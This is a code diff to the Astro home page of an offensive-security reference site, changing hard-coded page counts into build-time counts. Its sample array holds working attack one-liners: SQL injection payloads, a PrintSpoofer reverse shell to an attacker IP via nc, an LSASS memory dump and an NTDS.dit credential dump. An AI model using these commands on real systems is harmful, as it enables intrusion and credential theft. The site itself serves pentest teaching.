@@ -9,12 +9,12 @@
 // Layout sketch:
 //
 //   ┌─────────────────────────────────────────────────────────────────┐
-//   │ ● codex / main  · 163 pages · 15 clusters       athena · cc-by  │  ← status strip
+//   │ ● codex / main  · N pages · N clusters          athena · cc-by  │  ← status strip
 //   ├──────────────────────────────────────┬──────────────────────────┤
 //   │  $ whoami                            │      [LOGO + glow]       │
 //   │  > offensive-security operator       │                          │
-//   │  $ codex --about                     │   163 pages              │
-//   │                                       │   15 clusters            │
+//   │  $ codex --about                     │   N pages                │
+//   │                                       │   N clusters             │
 //   │  The Codex is a field reference...   │   3 sections             │
 //   │                                       │                          │
 //   │  [ $ enter the codex ]  [ github ↗ ] │                          │
@@ -22,7 +22,7 @@
 //   │ $ ls codex/                                                     │
 //   │ ┌──────────┐  ┌────────────────┐  ┌──────────┐                  │
 //   │ │ network/ │  │ web/           │  │ windows/ │                  │
-//   │ │ 23 pages │  │ 130 pages (12) │  │ 10 pages │                  │
+//   │ │ N pages  │  │ N pages (12)   │  │ N pages  │                  │
 //   │ └──────────┘  └────────────────┘  └──────────┘                  │
 //   ├─────────────────────────────────────────────────────────────────┤
 //   │ ◆ random      [tag · topic]      ↻ reroll                       │
@@ -39,11 +39,59 @@
 //   • The reroll button has a subtle rotate-on-press microinteraction.
 //   • prefers-reduced-motion disables ALL animation including the typing.
 
+import { getCollection } from 'astro:content';
 import CodexLogo from './CodexLogo.astro';
 
-const PAGE_COUNT = 163;
-const CLUSTER_COUNT = 15;
-const SECTION_COUNT = 3;
+// Sections and clusters shown in the `ls codex/` grid. Page counts are
+// computed from the content collection at build time, so they can't drift
+// as pages are added. To add a cluster, add its directory here (and to the
+// sidebar in astro.config.mjs).
+const SECTIONS = [
+  {
+    name: 'network',
+    clusters: [
+      { label: 'reconnaissance', path: 'network/recon' },
+      { label: 'service footprinting', path: 'network/services' },
+    ],
+  },
+  {
+    name: 'web',
+    wide: true,
+    clusters: [
+      { label: 'sql injection', path: 'web/sqli' },
+      { label: 'server-side', path: 'web/server-side' },
+      { label: 'auth & sessions', path: 'web/auth' },
+      { label: 'sessions', path: 'web/sessions' },
+      { label: 'wordpress', path: 'web/wordpress' },
+      { label: 'lfi / rfi', path: 'web/lfi' },
+      { label: 'file upload', path: 'web/uploads' },
+      { label: 'xss', path: 'web/xss' },
+      { label: 'command injection', path: 'web/command-injection' },
+      { label: 'web services', path: 'web/web-services' },
+      { label: 'xxe', path: 'web/xxe' },
+      { label: 'idor', path: 'web/idor' },
+    ],
+  },
+  {
+    name: 'windows',
+    clusters: [{ label: 'privilege escalation', path: 'windows/privesc' }],
+  },
+];
+
+const codexDocs = (await getCollection('docs')).filter((d) => d.id.startsWith('codex/'));
+const countUnder = (path: string) =>
+  codexDocs.filter((d) => d.id === `codex/${path}` || d.id.startsWith(`codex/${path}/`)).length;
+
+const sections = SECTIONS.map((section) => {
+  const clusters = section.clusters
+    .map((c) => ({ ...c, count: countUnder(c.path) }))
+    .sort((a, b) => b.count - a.count);
+  return { ...section, clusters, count: countUnder(section.name) };
+});
+
+const PAGE_COUNT = codexDocs.length;
+const CLUSTER_COUNT = sections.reduce((n, s) => n + s.clusters.length, 0);
+const SECTION_COUNT = sections.length;
 
 const samples = [
   // Single-line commands. Long ones will scroll horizontally in the
@@ -51,7 +99,7 @@ const samples = [
   // multiple commands or structured content (XXE has two XML lines,
   // NTDS dump has three sequential commands, IDOR loop is a bash block).
   { tag: 'sqli',    topic: 'union-based · mysql',     code: "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -", link: '/codex/web/sqli/union-based/' },
-  { tag: 'sqli',    topic: 'blind · time-based',      code: "1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -",                                                          link: '/codex/web/sqli/blind/' },
+  { tag: 'sqli',    topic: 'blind · time-based',      code: "1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -",                                                          link: '/codex/web/sqli/blind-time/' },
   { tag: 'privesc', topic: 'win · SeImpersonate',     code: 'PrintSpoofer.exe -c "nc.exe 10.10.14.3 443 -e cmd.exe"',                                                            link: '/codex/windows/privesc/seimpersonate/' },
   { tag: 'privesc', topic: 'win · SeDebug',           code: 'rundll32.exe comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\lsass.dmp full',                                  link: '/codex/windows/privesc/sedebugprivilege/' },
   { tag: 'privesc', topic: 'win · NTDS dump',         code: 'diskshadow.exe /s diskshadow.txt\nCopy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit .\nsecretsdump.py -ntds ntds.dit -system SYSTEM LOCAL', link: '/codex/windows/privesc/backup-operators/' },
@@ -146,55 +194,21 @@ const samples = [
     </div>
 
     <div class="ch-clusters__grid">
-
-      <div class="ch-card">
-        <div class="ch-card__rail"></div>
-        <div class="ch-card__head">
-          <span class="ch-card__sigil">[01]</span>
-          <span class="ch-card__name">network/</span>
-          <span class="ch-card__count">23</span>
+      {sections.map((section, i) => (
+        <div class={section.wide ? 'ch-card ch-card--wide' : 'ch-card'}>
+          <div class="ch-card__rail"></div>
+          <div class="ch-card__head">
+            <span class="ch-card__sigil">[{String(i + 1).padStart(2, '0')}]</span>
+            <span class="ch-card__name">{section.name}/</span>
+            <span class="ch-card__count">{section.count}</span>
+          </div>
+          <ul class={section.wide ? 'ch-card__items ch-card__items--cols' : 'ch-card__items'}>
+            {section.clusters.map((c) => (
+              <li><a href={`/codex/${c.path}/`}><span>{c.label}</span><span class="ch-card__sub">{c.count}</span></a></li>
+            ))}
+          </ul>
         </div>
-        <ul class="ch-card__items">
-          <li><a href="/codex/network/recon/"><span>reconnaissance</span><span class="ch-card__sub">5</span></a></li>
-          <li><a href="/codex/network/services/"><span>service footprinting</span><span class="ch-card__sub">18</span></a></li>
-        </ul>
-      </div>
-
-      <div class="ch-card ch-card--wide">
-        <div class="ch-card__rail"></div>
-        <div class="ch-card__head">
-          <span class="ch-card__sigil">[02]</span>
-          <span class="ch-card__name">web/</span>
-          <span class="ch-card__count">130</span>
-        </div>
-        <ul class="ch-card__items ch-card__items--cols">
-          <li><a href="/codex/web/sqli/"><span>sql injection</span><span class="ch-card__sub">21</span></a></li>
-          <li><a href="/codex/web/server-side/"><span>server-side</span><span class="ch-card__sub">25</span></a></li>
-          <li><a href="/codex/web/auth/"><span>auth &amp; sessions</span><span class="ch-card__sub">12</span></a></li>
-          <li><a href="/codex/web/sessions/"><span>sessions</span><span class="ch-card__sub">10</span></a></li>
-          <li><a href="/codex/web/wordpress/"><span>wordpress</span><span class="ch-card__sub">10</span></a></li>
-          <li><a href="/codex/web/lfi/"><span>lfi / rfi</span><span class="ch-card__sub">9</span></a></li>
-          <li><a href="/codex/web/uploads/"><span>file upload</span><span class="ch-card__sub">8</span></a></li>
-          <li><a href="/codex/web/xss/"><span>xss</span><span class="ch-card__sub">8</span></a></li>
-          <li><a href="/codex/web/command-injection/"><span>command injection</span><span class="ch-card__sub">8</span></a></li>
-          <li><a href="/codex/web/web-services/"><span>web services</span><span class="ch-card__sub">7</span></a></li>
-          <li><a href="/codex/web/xxe/"><span>xxe</span><span class="ch-card__sub">7</span></a></li>
-          <li><a href="/codex/web/idor/"><span>idor</span><span class="ch-card__sub">5</span></a></li>
-        </ul>
-      </div>
-
-      <div class="ch-card">
-        <div class="ch-card__rail"></div>
-        <div class="ch-card__head">
-          <span class="ch-card__sigil">[03]</span>
-          <span class="ch-card__name">windows/</span>
-          <span class="ch-card__count">10</span>
-        </div>
-        <ul class="ch-card__items">
-          <li><a href="/codex/windows/privesc/"><span>privilege escalation</span><span class="ch-card__sub">10</span></a></li>
-        </ul>
-      </div>
-
+      ))}
     </div>
   </section>
 
